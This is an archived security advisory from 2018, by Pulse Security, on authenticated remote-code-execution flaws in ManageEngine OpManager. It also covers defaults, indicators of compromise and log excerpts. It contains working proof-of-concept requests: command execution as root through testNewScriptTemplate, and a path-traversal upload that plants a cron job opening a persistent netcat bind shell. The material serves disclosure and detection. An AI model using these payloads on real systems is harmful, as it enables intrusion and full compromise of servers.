---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-06-18_manage-engine-opmanager-multiple-authenticated-rce-vulnerabilities.md
original_filename: 2018-06-18_manage-engine-opmanager-multiple-authenticated-rce-vulnerabilities.md
title: Manage Engine OpManager Multiple Authenticated RCE Vulnerabilities
category: documents
detected_topics:
- api-security
- command-injection
- path-traversal
- supply-chain
- access-control
- file-upload
tags:
- imported
- documents
- api-security
- command-injection
- path-traversal
- supply-chain
- access-control
- file-upload
language: en
raw_sha256: fe982a411a8697d4dca0042597fec35e604d4c56a556100ceb1796db9933463e
text_sha256: c4bb15573d0e19cc73f5e5efcad74372bdb4e1eb9dd3044bffba94efb5004127
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: true
---

# Manage Engine OpManager Multiple Authenticated RCE Vulnerabilities

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-06-18_manage-engine-opmanager-multiple-authenticated-rce-vulnerabilities.md
- Source Type: markdown
- Detected Topics: api-security, command-injection, path-traversal, supply-chain, access-control, file-upload
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: True
- Raw SHA256: `fe982a411a8697d4dca0042597fec35e604d4c56a556100ceb1796db9933463e`
- Text SHA256: `c4bb15573d0e19cc73f5e5efcad74372bdb4e1eb9dd3044bffba94efb5004127`


## Content

---
title: "Manage Engine OpManager Multiple Authenticated RCE Vulnerabilities"
url: "https://pulsesecurity.co.nz/advisories/ManageEngine-OpManager-RCE"
final_url: "https://pulsesecurity.co.nz/advisories/ManageEngine-OpManager-RCE"
authors: ["Denis Andzakovic"]
programs: ["Zoho (ManageEngine)"]
bugs: ["RCE", "Path traversal", "Unrestricted file upload", "Information disclosure", "Arbitrary file write"]
publication_date: "2018-06-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5835
---

# Manage Engine OpManager Multiple Authenticated RCE Vulnerabilities

by Denis Andzakovic

### Recent Releases

####  advisories [See all](/advisories)

  * 12/6/24  [CodiMD Unauthorised Image Access](/advisories/codimd-missing-image-access-controls)
  * 5/6/24  [Slack Web Hook Message Injection Advisory](/advisories/slack-message-injection)
  * 18/3/24  [Bypassing USBGuard on Linux](/advisories/usbguard-bypass)
  * 20/9/23  [HDF5 - Multiple Memory Corruption Vulnerabilities](/advisories/hdf5-memory-corruption)

* * *

####  articles [See all](/articles)

  * 26/5/26  [Stealing Browser Sessions with DevTools](/articles/stealing_browser_sessions_with_devtools)
  * 22/5/26  [Timeboxed Penetration Testing - Pulse Security’s Approach](/articles/timeboxed-penetration-tests)
  * 13/2/26  [Harvesting Intune Device Scripts Without Tools](/articles/intune-device-scripts)
  * 14/1/26  [Sensitive data in URLs: Why private links aren’t private anymore due to threat intelligence feeds](/articles/unguessable_url_issues)

Jun 19 2018

Pulse Security has identified two vulnerabilities in the ManageEngine OpManager software currently being exploited in the wild, and one observational note. This document details the vulnerabilities and the indicators of compromise that may be used to identify these exploits.

The remote code execution vulnerabilities were confirmed against build 123148. Pulse Security are not aware of an official patch to address these vulnerabilities.

**UPDATE:** Manage Engine have released patch 123160 that allegedly fixes these issues

**Title:** ManageEngine OpManager – Multiple Authenticated RCE Vulnerabilities  
**Date Released:** 19/06/2018  
**Author:** Denis Andzakovic  
**Vendor Website:** https://www.manageengine.com/network-monitoring/  
**Affected Software:** ManageEngine OpManager

## Summary

The `testNewScriptTemplate` API was used by attackers in the wild to execute arbitrary commands after gaining initial access to the OpManager installation. The `testNewScriptTemplate` API is used to execute scripts on OpManager managed hosts and is intended functionality. The `uploadMib` API was also leveraged by attackers to upload files. The `uploadMib` endpoint is vulnerable to directory traversal and may be used to overwrite files and gain code execution. Additionally, the `mobileNativeLogin` API uses passwords submitted via the HTTP GET parameter, which exposes this information in the OpManager access log.

This advisory should not be considered a definitive list of vulnerabilities within OpManager. Additional vulnerabilities and intended functionality allowing for arbitrary command execution likely exist.

## Recommendations

All the vulnerabilities detailed in this document require authentication. The OpManager installation ships with multiple default user accounts and passwords, which increases the likelihood of exploitation. Additionally, OpManager does not implement brute force protection for these accounts. Pulse Security recommends changing the password for the admin user, removing the `trialuserlogin` account and ensuring the `IntegrationUser` account cannot login. Users who have upgraded from an earlier version of OpManager may still have the `IntegrationUser` enabled. Access logs should be monitored for any unauthorized access attempts. The OpManager server should be adequately defended with network layer access controls and application logfile monitoring. As the OpManager stores credentials for services such as WMI and VMWare logins in a reversible encryption format, there is a high risk of further environment compromise after the attacker compromises the OpManager application.

## Vulnerabilities

### testNewScriptTemplate Command Execution

The `testNewScriptTemplate` API allows OpManager user to execute arbitrary commands. The following figures details the request used to execute arbitrary commands on the OpManager host. This vulnerability was tested on an OpManager Linux installation.
  
  
  POST /api/json/admin/testNewScriptTemplate?apiKey=<valid API key> HTTP/1.1
  Host: 192.168.38.159
  Content-Length: 193
  Accept: application/json, text/javascript, */*; q=0.01
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  Connection: close
  
  scriptTemplateName=test&interval=15&yaxisText=units&commandLine=/bin/bash -e
  ${FileName}&scriptBody=#!/bin/bash%0aid&timeout=10&executeFrom=Local&workingDir=%2Fvar%2Ftmp%2F&deviceName=opmanager
  
  
  
  HTTP/1.1 200
  _ommited_
  
  {"message":"","dataMap":{},"rawoutput":"uid=0(root) gid=0(root)
  groups=0(root)","exitCode":0}
  

Note that for the request to succeed the target device needs to have a non-null type. The opanager device’s type was set to an arbitrary string using the following request
  
  
  POST /api/json/device/UpdateDeviceDetails?apiKey=<valid API key> HTTP/1.1
  Host: 192.168.38.159
  Content-Length: 198
  Accept: application/json, text/javascript, */*; q=0.01
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  Connection: close
  
  name=opmanager&category=Unknown&TcpPortNumber=0&displayName=Opmanager&ipAddress=192.168.38.159&vendor=Vmware&Dependency=None&type=Whatever&ramSize=0&hardDiskSize=0&Encoding=ISO-8859-1&pollUsing=ICMP
  

### uploadMib File Upload

The `uploadMib` API endpoint allows for path traversal and the creation of files with no extension. This allows a malicious user to overwrite files as the root user. The following POC uploads a crontab configuration that creates a persistent bind shell. Two minutes must elapse between the upload and a bind shell being established.
  
  
  POST /api/json/mibbrowser/uploadMib?apiKey=<valid API key> HTTP/1.1
  Host: 192.168.38.159
  Content-Length: 449
  Content-Type: multipart/form-data; boundary=----***REDACTED-SUSPECT-TOKEN***  Connection: close
  
  ------***REDACTED-SUSPECT-TOKEN***  Content-Disposition: form-data; name="mibFile";filename="../../../../../../etc/cron.d/opman"
  Content-Type: application/octet-stream
  
  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  * * * * * root test -p /dev/shm/pipe && /bin/bash < /dev/shm/pipe 2>&1 | nc -l -p 4132 >
  /dev/shm/pipe 2>/dev/null || mkfifo /dev/shm/pipe
  
  ------WebKitFormBoundaryyFV62c116f93bfaA--
  
  
  
  :~$ nc -v 192.168.38.159 4132
  Connection to 192.168.38.159 4132 port [tcp/*] succeeded!
  id
  uid=0(root) gid=0(root) groups=0(root)
  

### mobileNativeLogin Password in GET Request

The `mobileNativeLogin` endpoint, used by the OpManager mobile application, expects passwords submitted via a HTTP GET parameter. This behavior exposes the passwords in the OpManager `access_log.txt` file. An attacker who has compromised the OpManager server may leverage this behavior to gain further access in the wider environment.

The following figure shows an excerpt of the `access_log.txt` file containing the cleartext passwords:
  
  
  192.168.38.182 - - [08/Jun/2018:10:55:32 +1300] "POST
  /mobileNativeLogin?password=***REDACTED*** protected]](/cdn-cgi/l/email-protection) HTTP/1.1" 200 212
  

This vulnerability was allegedly fixed in the 12300 release.

## Indicators of Compromise

The following section details the example log file entries for detecting the above vulnerabilities.

### testNewScriptTemplate Command Execution
  
  
  = logs/access_log.txt =
  192.168.38.162 - - [08/Jun/2018:04:09:53 +0000] "/api/json/admin/testNewScriptTemplate" 200 105
  

The `opmanager_serverOut_0.txt` file contains significant information concerning the script execution, however this log file rolls over frequently.
  
  
  = logs/opm/opmanager_serverout_0.txt =
  [04:14:52:844]|[06-08-2018]|[com.adventnet.opmanager.opmservout]|[INFO]|[378]:
  OpManagerAPIServlet:: processRequest:: uri : /admin/testNewScriptTemplate|
  [04:14:52:848]|[06-08-2018]|[com.adventnet.opmanager.opmservout]|[INFO]|[378]: SCRIPT::
  ExecuteScriptHandler:: executeScript: opmanager|
  [04:14:52:849]|[06-08-2018]|  [com.adventnet.opmanager.opmservout]|[INFO]|[378]: SCRIPT::
  ExecuteScriptHandler:: fileNameWithExt: /var/tmp/OpManager_0_1528431292849|
  [04:14:52:855]|[06-08-2018]|[com.adventnet.opmanager.opmservout]|[INFO]|[378]: SCRIPT::
  ExecuteScriptHandler:: Command to execute: /bin/bash -e OpManager_0_1528431292849|
  [04:14:52:864]|[06-08-2018]|[com.adventnet.opmanager.opmservout]|[INFO]|[378]: SCRIPT::
  ExecuteScriptHandler:: Script execution finished. ScriptID:0; Script Result:{Data={},
  message=, RawData=Linux opmanager 4.15.0-22-generic #24-Ubuntu SMP Wed May 16 12:15:17 UTC
  2018 x86_64 x86_64 x86_64 GNU/Linux, scriptID=0, exitcode=0}|
  [04:14:52:865]|[06-08-2018]|[com.adventnet.opmanager.opmservout]|[INFO]|[378]:
  OpManagerAPIServlet:: Request uri : /admin/testNewScriptTemplate & processing time : 21|
  

The `testNewScriptTemplate` API creates temporary files which are executed. The attacker may place their payload either in the `commandLine` or `scriptBody` parameters. The temporary files are unlinked after the commands are executed, however filesystem analysis can retrieve these files. An attacker may avoid having the malicious `scriptBody` retrieved by leveraging a `tmpfs` filesystem, such as `/dev/shm`.

### uploadMib File Upload
  
  
  = logs/access_log.txt =
  192.168.38.162 - admin [08/Jun/2018:04:23:10 +0000] "/api/json/mibbrowser/uploadMib" 200
  106
  
  
  
  = logs/opm/opmanager_serverout_0.txt =
  [04:23:09:952]|[06-08-2018]|[com.adventnet.opmanager.opmservout]|[INFO]|[380]:
  OpManagerAPIServlet:: processRequest:: uri : /mibbrowser/uploadMib|
  [04:23:10:001]|[06-08-2018]|[com.adventnet.opmanager.opmservout]|[INFO]|[380]:
  OpManagerAPIServlet:: Request uri : /mibbrowser/uploadMib & processing time : 49|
  

## TIMELINE

11/06/2018 - Initial email to Zoho  
12/06/2018 - Advisory document sent to Zoho  
12/06/2018 - Acknowledgement from Zoho  
19/06/2018 - Advisory release

* * *

_Follow us on[LinkedIn](https://nz.linkedin.com/company/pulsesecurity)_

* * *
